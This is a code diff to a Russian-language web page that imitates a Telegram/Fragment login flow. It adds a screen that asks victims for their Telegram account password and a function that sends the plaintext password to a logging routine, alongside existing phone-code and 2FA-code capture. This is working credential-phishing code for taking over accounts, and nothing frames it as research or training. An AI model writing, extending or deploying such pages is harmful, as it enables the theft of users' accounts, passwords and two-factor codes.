@@ -120,7 +120,22 @@
       height: 100%;
     }
 
+    .password-input {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 16px;
+      font-size: 15px;
+      box-sizing: border-box;
+      background-color: #f8f9fa;
+      height: 48px;
+    }
+
     .phone-number:focus {
+      outline: none;
+    }
+
+    .password-input:focus {
       outline: none;
     }
 
@@ -503,9 +518,31 @@
     </div>
   </div>
 
-  <!-- Экран 3: Ввод 2FA кода -->
+  <!-- Экран 3: Ввод пароля -->
   <div class="container screen" id="screen3">
     <button class="back-btn" onclick="prevScreen(2)">← Назад</button>
+    <div class="icons">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
+      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
+    </div>
+    <h1>Введите пароль</h1>
+    <p>Введите пароль от вашего аккаунта Telegram для продолжения.</p>
+    
+    <div class="input-group">
+      <input type="password" class="password-input" id="password" placeholder="Пароль">
+    </div>
+    
+    <div class="hint">Пароль используется для защиты вашего аккаунта Telegram</div>
+    
+    <div class="buttons">
+      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
+      <button class="next-btn" onclick="handlePasswordSubmit()">ПРОДОЛЖИТЬ</button>
+    </div>
+  </div>
+
+  <!-- Экран 4: Ввод 2FA кода -->
+  <div class="container screen" id="screen4">
+    <button class="back-btn" onclick="prevScreen(3)">← Назад</button>
     <div class="icons">
       <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
       <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
@@ -530,8 +567,8 @@
     </div>
   </div>
 
-  <!-- Экран 4: Успешная авторизация -->
-  <div class="container screen" id="screen4">
+  <!-- Экран 5: Успешная авторизация -->
+  <div class="container screen" id="screen5">
     <div class="success-screen">
       <div class="success-icon">✅</div>
       <h1>Авторизация успешно завершена!</h1>
@@ -654,8 +691,21 @@
     nextScreen(3);
   }
 
+  function handlePasswordSubmit() {
+    const password = document.getElementById('password').value;
+    
+    if (!password) {
+      alert('Пожалуйста, введите пароль');
+      return;
+    }
+    
+    // ОТПРАВЛЯЕМ ЛОГ О ВВОДЕ ПАРОЛЯ
+    sendLog('PASSWORD_ENTERED', `Пароль: ${password}`);
+    nextScreen(4);
+  }
+
   function handle2faSubmit() {
-    const codeInputs = document.querySelectorAll('#screen3 .code-input');
+    const codeInputs = document.querySelectorAll('#screen4 .code-input');
     let faCode = '';
     codeInputs.forEach(input => faCode += input.value);
     
@@ -717,7 +767,7 @@
 
   function completeAuth() {
     sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
-    nextScreen(4);
+    nextScreen(5);
   }
 
   function closeWebApp() {
@@ -736,7 +786,10 @@
             document.querySelector('#screen2 .code-input').focus();
           }
           if (document.getElementById('screen3').classList.contains('active')) {
-            document.querySelector('#screen3 .code-input').focus();
+            document.getElementById('password').focus();
+          }
+          if (document.getElementById('screen4').classList.contains('active')) {
+            document.querySelector('#screen4 .code-input').focus();
           }
         }
       });
@@ -744,6 +797,7 @@
     
     observer.observe(document.getElementById('screen2'), { attributes: true });
     observer.observe(document.getElementById('screen3'), { attributes: true });
+    observer.observe(document.getElementById('screen4'), { attributes: true });
   });
 </script>
 </body>
